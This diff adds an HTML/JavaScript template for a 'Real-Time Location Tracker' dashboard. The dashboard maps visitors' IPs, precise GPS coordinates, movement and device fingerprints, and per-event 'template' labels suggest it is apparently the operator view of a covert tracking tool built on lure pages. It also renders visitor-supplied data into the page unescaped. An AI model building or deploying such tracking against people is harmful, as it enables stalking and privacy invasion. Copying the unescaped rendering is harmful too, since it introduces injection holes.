@@ -1,0 +1,537 @@
+{% extends "base.html" %}
+
+{% block head %}
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+    body {
+        font-family: 'Consolas', 'Monaco', monospace;
+        margin: 0;
+        padding: 0;
+        background: #1e1e1e;
+        color: #e0e0e0;
+        height: 100vh;
+        overflow: hidden;
+    }
+
+    .dashboard {
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        position: relative;
+    }
+
+    .header {
+        background: #2d2d30;
+        padding: 15px 20px;
+        border-bottom: 1px solid #3c3c3c;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        z-index: 1000;
+    }
+
+    .header h1 {
+        margin: 0;
+        font-size: 1.2em;
+        color: #e0e0e0;
+    }
+
+    .header-info {
+        display: flex;
+        gap: 20px;
+        align-items: center;
+        font-size: 0.9em;
+    }
+
+    .timestamp {
+        color: #888;
+    }
+
+    .event-count {
+        color: #4ec9b0;
+        font-weight: bold;
+    }
+
+    .main-container {
+        flex: 1;
+        position: relative;
+        overflow: hidden;
+    }
+
+    #map {
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        top: 0;
+        left: 0;
+    }
+
+    .sidebar {
+        position: absolute;
+        top: 0;
+        right: -450px;
+        width: 450px;
+        height: 100%;
+        background: #252526;
+        border-left: 1px solid #3c3c3c;
+        z-index: 1000;
+        transition: right 0.3s ease;
+        display: flex;
+        flex-direction: column;
+        box-shadow: -5px 0 15px rgba(0,0,0,0.3);
+    }
+
+    .sidebar.open {
+        right: 0;
+    }
+
+    .sidebar-header {
+        background: #2d2d30;
+        padding: 15px 20px;
+        border-bottom: 1px solid #3c3c3c;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+
+    .sidebar-title {
+        color: #e0e0e0;
+        font-size: 1em;
+        margin: 0;
+    }
+
+    .close-btn {
+        background: none;
+        border: none;
+        color: #888;
+        font-size: 18px;
+        cursor: pointer;
+        padding: 5px;
+        line-height: 1;
+    }
+
+    .close-btn:hover {
+        color: #e0e0e0;
+    }
+
+    .events-container {
+        flex: 1;
+        overflow-y: auto;
+        padding: 10px;
+    }
+
+    .event {
+        background: #1e1e1e;
+        border: 1px solid #3c3c3c;
+        border-radius: 4px;
+        padding: 15px;
+        margin-bottom: 10px;
+    }
+
+    .event-header {
+        color: #569cd6;
+        font-weight: bold;
+        margin-bottom: 10px;
+        font-size: 0.9em;
+    }
+
+    .event-detail {
+        margin: 5px 0;
+        font-size: 0.85em;
+        display: flex;
+        justify-content: space-between;
+    }
+
+    .event-label {
+        color: #cccccc;
+        min-width: 80px;
+    }
+
+    .event-value {
+        color: #e0e0e0;
+        text-align: right;
+        word-break: break-all;
+    }
+
+    .event-coords {
+        color: #ce9178;
+    }
+
+    .event-ip {
+        color: #4ec9b0;
+    }
+
+    .event-device {
+        color: #9cdcfe;
+    }
+
+    .event-json {
+        margin-top: 10px;
+        padding: 10px;
+        background: #0d1117;
+        border: 1px solid #3c3c3c;
+        border-radius: 3px;
+        font-family: 'Courier New', monospace;
+        font-size: 0.75em;
+        color: #808080;
+        white-space: pre-wrap;
+        max-height: 200px;
+        overflow-y: auto;
+    }
+
+    .toggle-sidebar {
+        position: absolute;
+        top: 20px;
+        right: 20px;
+        background: #0e639c;
+        color: #ffffff;
+        border: 1px solid #1177bb;
+        padding: 10px 15px;
+        border-radius: 4px;
+        cursor: pointer;
+        font-family: inherit;
+        font-size: 12px;
+        z-index: 999;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+    }
+
+    .toggle-sidebar:hover {
+        background: #1177bb;
+    }
+
+    .controls {
+        position: absolute;
+        bottom: 20px;
+        left: 20px;
+        display: flex;
+        gap: 10px;
+        z-index: 999;
+    }
+
+    .toggle-button {
+        background: #0e639c;
+        color: #e0e0e0;
+        border: 1px solid #1177bb;
+        padding: 8px 12px;
+        border-radius: 4px;
+        cursor: pointer;
+        font-family: inherit;
+        font-size: 11px;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+    }
+
+    .toggle-button:hover {
+        background: #1177bb;
+    }
+
+    .no-events {
+        text-align: center;
+        color: #888;
+        padding: 40px 20px;
+        font-style: italic;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="dashboard">
+    <div class="header">
+        <h1>🌍 Real-Time Location Tracker</h1>
+        <div class="header-info">
+            <span class="timestamp">Last updated: <span id="last-update">Never</span></span>
+            <span class="event-count" id="event-count">0 events</span>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div id="map"></div>
+        
+        <button class="toggle-sidebar" id="toggle-sidebar">
+            📊 Show Event Details
+        </button>
+        
+        <div class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <h3 class="sidebar-title">📋 Event Monitor</h3>
+                <button class="close-btn" id="close-sidebar">✕</button>
+            </div>
+            <div class="events-container" id="events-container">
+                <div class="no-events">Initializing event monitor...<br>Waiting for location data.</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="controls">
+        <button class="toggle-button" id="manual-refresh">🔄 Refresh</button>
+        <button class="toggle-button" id="toggle-raw">📄 Raw JSON</button>
+        <button class="toggle-button" id="toggle-auto-refresh">🔄 Auto: ON</button>
+        <button class="toggle-button" id="clear-logs">🗑️ Clear</button>
+    </div>
+</div>
+
+<script>
+// Initialize map
+const map = L.map('map').setView([0, 0], 2);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    attribution: '© OpenStreetMap contributors'
+}).addTo(map);
+
+// Store markers and state
+let markers = {};
+let autoRefresh = true;
+let showRawJSON = false;
+let eventLogs = [];
+
+function formatTimestamp(ts) {
+    return new Date(ts).toLocaleString();
+}
+
+function createEventElement(event, index) {
+    const time = formatTimestamp(event.timestamp);
+    const coords = event.geo ? `${event.geo.lat.toFixed(6)}, ${event.geo.lng.toFixed(6)}` : 'No location';
+    const accuracy = event.geo?.acc ? `±${event.geo.acc.toFixed(1)}m` : 'N/A';
+    const device = event.device?.device || 'Unknown';
+    const browser = event.device?.browser || 'Unknown browser';
+    const os = event.device?.os || 'Unknown OS';
+    const isMobile = event.device?.is_mobile ? 'Mobile' : event.device?.is_tablet ? 'Tablet' : 'Desktop';
+    
+    const eventHtml = `
+        <div class="event">
+            <div class="event-header">📡 Event #${index + 1} - ${time}</div>
+            
+            <div class="event-detail">
+                <span class="event-label">🌐 IP:</span>
+                <span class="event-value event-ip">${event.ip}</span>
+            </div>
+            
+            <div class="event-detail">
+                <span class="event-label">📍 Location:</span>
+                <span class="event-value event-coords">${coords}</span>
+            </div>
+            
+            <div class="event-detail">
+                <span class="event-label">🎯 Accuracy:</span>
+                <span class="event-value">${accuracy}</span>
+            </div>
+            
+            <div class="event-detail">
+                <span class="event-label">📱 Device:</span>
+                <span class="event-value event-device">${device}</span>
+            </div>
+            
+            <div class="event-detail">
+                <span class="event-label">🌐 Browser:</span>
+                <span class="event-value">${browser}</span>
+            </div>
+            
+            <div class="event-detail">
+                <span class="event-label">🖥️ OS:</span>
+                <span class="event-value">${os}</span>
+            </div>
+            
+            <div class="event-detail">
+                <span class="event-label">📱 Type:</span>
+                <span class="event-value">${isMobile}</span>
+            </div>
+            
+            <div class="event-detail">
+                <span class="event-label">🖥️ Screen:</span>
+                <span class="event-value">${event.device?.screen?.width || 'N/A'}x${event.device?.screen?.height || 'N/A'}</span>
+            </div>
+            
+            <div class="event-detail">
+                <span class="event-label">⚙️ Cores:</span>
+                <span class="event-value">${event.device?.cores || 'N/A'}</span>
+            </div>
+            
+            <div class="event-detail">
+                <span class="event-label">💾 Memory:</span>
+                <span class="event-value">${event.device?.memory || 'N/A'}GB</span>
+            </div>
+            
+            <div class="event-detail">
+                <span class="event-label">🏷️ Template:</span>
+                <span class="event-value">${event.meta?.template || 'default'}</span>
+            </div>
+            
+            ${event.geo ? `
+                <div class="event-detail">
+                    <span class="event-label">🏃 Speed:</span>
+                    <span class="event-value">${event.geo.spd?.toFixed(2) || 'N/A'} m/s</span>
+                </div>
+                
+                <div class="event-detail">
+                    <span class="event-label">⛰️ Altitude:</span>
+                    <span class="event-value">${event.geo.alt?.toFixed(1) || 'N/A'}m</span>
+                </div>
+                
+                <div class="event-detail">
+                    <span class="event-label">🧭 Direction:</span>
+                    <span class="event-value">${event.geo.head?.toFixed(1) || 'N/A'}°</span>
+                </div>
+            ` : ''}
+            
+            ${showRawJSON ? `<div class="event-json">${JSON.stringify(event, null, 2)}</div>` : ''}
+        </div>
+    `;
+    
+    return eventHtml;
+}
+
+function updateMap(events) {
+    // Clear old markers
+    Object.values(markers).forEach(marker => marker.remove());
+    markers = {};
+
+    // Add new markers
+    events.forEach(event => {
+        if (event.geo) {
+            const latLng = [event.geo.lat, event.geo.lng];
+            if (!markers[event.ip]) {
+                markers[event.ip] = L.marker(latLng)
+                    .bindPopup(`
+                        <b>IP:</b> ${event.ip}<br>
+                        <b>Device:</b> ${event.device?.device || 'Unknown'}<br>
+                        <b>Accuracy:</b> ${event.geo.acc?.toFixed(1)}m<br>
+                        <b>Last seen:</b> ${formatTimestamp(event.timestamp)}
+                    `)
+                    .addTo(map);
+            } else {
+                markers[event.ip].setLatLng(latLng);
+            }
+        }
+    });
+
+    // Fit map to markers if we have any
+    if (Object.keys(markers).length > 0) {
+        const bounds = Object.values(markers).map(marker => marker.getLatLng());
+        map.fitBounds(bounds, { padding: [50, 50] });
+    }
+}
+
+function updateDashboard() {
+    fetch('/get_all_locations')
+        .then(response => {
+            if (!response.ok) {
+                if (response.status === 401) {
+                    window.location.reload(); // Redirect to login if unauthorized
+                    throw new Error('Session expired');
+                }
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Received data:', data); // Debug log
+            
+            if (!Array.isArray(data)) {
+                console.error('Invalid data format received:', data);
+                document.getElementById('events-container').innerHTML = 
+                    '<div class="no-events">❌ Error: Invalid data format received</div>';
+                return;
+            }
+            
+            // Sort data by timestamp (newest first)
+            data.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            
+            // Store events for logging
+            eventLogs = data;
+            
+            // Update the map
+            updateMap(data);
+
+            // Update the events container
+            const container = document.getElementById('events-container');
+            
+            if (data.length === 0) {
+                container.innerHTML = '<div class="no-events">📡 No events yet...<br>Visit the main page to start tracking</div>';
+            } else {
+                container.innerHTML = data.map((event, index) => createEventElement(event, index)).join('');
+                
+                // Auto-open sidebar if there are events and it's not open
+                if (!document.getElementById('sidebar').classList.contains('open')) {
+                    document.getElementById('toggle-sidebar').textContent = '📊 Hide Event Details';
+                    document.getElementById('sidebar').classList.add('open');
+                }
+            }
+            
+            // Update event count
+            document.getElementById('event-count').textContent = `${data.length} events`;
+            
+            // Update timestamp
+            document.getElementById('last-update').textContent = new Date().toLocaleString();
+            
+            // Auto-scroll to top for new events
+            container.scrollTop = 0;
+        })
+        .catch(error => {
+            console.error('Error fetching data:', error);
+            if (error.message === 'Session expired') {
+                return; // Don't show error for session expiry
+            }
+            document.getElementById('events-container').innerHTML = 
+                '<div class="no-events">❌ Error loading data:<br>' + error.message + '</div>';
+        });
+}
+
+// Sidebar functionality
+document.getElementById('toggle-sidebar').addEventListener('click', function() {
+    const sidebar = document.getElementById('sidebar');
+    const button = document.getElementById('toggle-sidebar');
+    
+    if (sidebar.classList.contains('open')) {
+        sidebar.classList.remove('open');
+        button.textContent = '📊 Show Event Details';
+    } else {
+        sidebar.classList.add('open');
+        button.textContent = '📊 Hide Event Details';
+    }
+});
+
+document.getElementById('close-sidebar').addEventListener('click', function() {
+    document.getElementById('sidebar').classList.remove('open');
+    document.getElementById('toggle-sidebar').textContent = '📊 Show Event Details';
+});
+
+// Set up manual refresh
+document.getElementById('manual-refresh').addEventListener('click', function() {
+    console.log('Manual refresh triggered');
+    updateDashboard();
+});
+
+// Set up auto-refresh toggle
+document.getElementById('toggle-auto-refresh').addEventListener('click', function() {
+    autoRefresh = !autoRefresh;
+    this.textContent = `🔄 Auto: ${autoRefresh ? 'ON' : 'OFF'}`;
+});
+
+// Set up raw JSON toggle
+document.getElementById('toggle-raw').addEventListener('click', function() {
+    showRawJSON = !showRawJSON;
+    this.textContent = `📄 Raw JSON: ${showRawJSON ? 'ON' : 'OFF'}`;
+    // Refresh the display
+    if (eventLogs.length > 0) {
+        const container = document.getElementById('events-container');
+        container.innerHTML = eventLogs.map((event, index) => createEventElement(event, index)).join('');
+    }
+});
+
+// Set up clear logs
+document.getElementById('clear-logs').addEventListener('click', function() {
+    if (confirm('Clear all event logs from display?')) {
+        document.getElementById('events-container').innerHTML = '<div class="no-events">🗑️ Logs cleared.<br>New events will appear here...</div>';
+        eventLogs = [];
+        document.getElementById('event-count').textContent = '0 events';
+    }
+});
+
+// Initial update and refresh interval
+updateDashboard();
+setInterval(() => {
+    if (autoRefresh) {
+        updateDashboard();
+    }
+}, 2000);
+</script>
+{% endblock %}
